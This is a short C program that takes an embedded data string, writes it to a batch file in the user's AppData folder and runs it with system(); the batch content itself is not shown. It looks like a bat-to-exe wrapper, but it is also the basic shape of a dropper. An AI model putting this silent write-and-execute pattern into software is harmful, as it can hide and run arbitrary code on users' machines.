#include "run.h"
#include <stdio.h>
#include <stdlib.h>

char * addC(char * first,char *second);
int main()
{
    char * data = getData();
    FILE * fPtr;
    char * fileName=malloc(2048);
    fileName[0]=0;
    strcat(fileName,getenv("HOMEDRIVE"));
    strcat(fileName,getenv("HOMEPATH"));
    strcat(fileName,"\\AppData\\bat.bat");
    fPtr = fopen(fileName, "w");
    fputs(data, fPtr);
    fclose(fPtr);
    system(fileName);
    return 0;
}